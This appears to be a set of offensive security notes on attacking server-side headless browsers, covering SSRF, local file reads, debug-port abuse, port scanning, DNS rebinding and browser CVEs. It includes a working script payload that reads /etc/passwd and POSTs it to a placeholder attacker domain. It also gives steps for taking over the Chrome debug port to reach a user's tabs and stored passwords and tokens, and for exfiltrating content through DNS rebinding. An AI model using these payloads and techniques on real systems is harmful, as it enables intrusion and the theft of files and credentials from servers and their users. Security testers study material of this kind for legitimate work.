entries.title: What a headless browser is and where it appears
entries.body:
A headless browser (Chrome/Firefox/Edge without a GUI) interprets HTML/CSS/JS in the background. Used for scraping, testing, PDF generation and screenshots.
The attack arises when the attacker controls a URL/HTML that a server-side headless browser renders -> reading local files, SSRF, port scanning.

entries.title: Exfiltrating /etc/passwd via fetch
entries.body:
<script>
  async function getFlag(){
    response = await fetch("file:///etc/passwd");
    flag = await response.text();
  fetch("https://[ATTACKER.DOMAIN.TLD]/", { method: "POST", body: flag})
  };
  getFlag();
</script>

entries.title: PDF rendering - JS redirect to a file
PDF rendering - iframe to a file
What the debug port is (9222)
entries.body:
The Remote Debugging Port exposes the DevTools Protocol over TCP so external tools can control the browser. Usually port 9222, changed via --remote-debugging-port=.
Goal: google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html
Note: as of Chrome 136 you also need --user-data-dir pointing to a non-default folder; since Dec 2022 connecting over websocket requires --remote-allow-origins="*".

entries.title: Exploiting the debug port
entries.body:
• Connect: chrome://inspect/#devices, opera://inspect/#devices
• Kill the browser and relaunch with --restore-last-session -> access to the user's tabs
• Settings data (logins/passwords/tokens): chrome://settings
• Port scan: in a loop, open http://localhost:<port>/json/new?http://[ATTACKER.DOMAIN.TLD]/?port=<port>
• UUID leak: iframe to http://127.0.0.1:<port>/json/version
• File read: pich4ya/chrome_remote_debug_lfi.py
Tools: WhiteChocolateMacademiaNut (slyd0g), ripWCMN.py.

entries.title: Node inspector (--inspect) - same as the debug port
entries.body:
node --inspect app.js          # default port 9229
node --inspect=4444 app.js     # custom port 4444
node --inspect=0.0.0.0:4444 app.js

entries.title: Port Scanning - timing attack
entries.body: • Dynamically inject an pointing at a presumably closed port, measure the time until onerror. • Repeat >=10 times -> average error time for a closed port. • Test a random port 10 times, measure the time until the error. • If time_to_error(random_port) > time_to_error(closed_port)*1.3 -> the port is open. Caveat: by default Chrome blocks the "known ports" list and access to the local network, except localhost via 0.0.0.0.

entries.title: DNS Rebinding via headless
entries.body:
Tool: nccgroup/singularity.
1. Chrome makes 2 DNS requests: A and AAAA.
   • AAAA -> valid external IP
   • A -> internal IP
2. Chrome connects to IPv6 first (evil.net).
3. Close the IPv6 listener right after the first response.
4. Open an iframe to evil.net.
5. IPv6 does not respond -> Chrome falls back to IPv4 (internal).
6. From the top window, inject a script into the iframe and exfiltrate the content.

entries.title: Exploitation via a browser CVE
entries.body:
Identify the browser by its User-Agent -> pick an exploit for the component (V8, Blink, WebKit).
Chrome: CVE-2024-9122 (WASM type confusion), CVE-2025-5419 (OOB read/write in V8).
Firefox: CVE-2024-9680 (use-after-free).
The --no-sandbox flag disables the renderer sandbox (puppeteer.launch({args:['--no-sandbox']})) - it dramatically simplifies RCE.
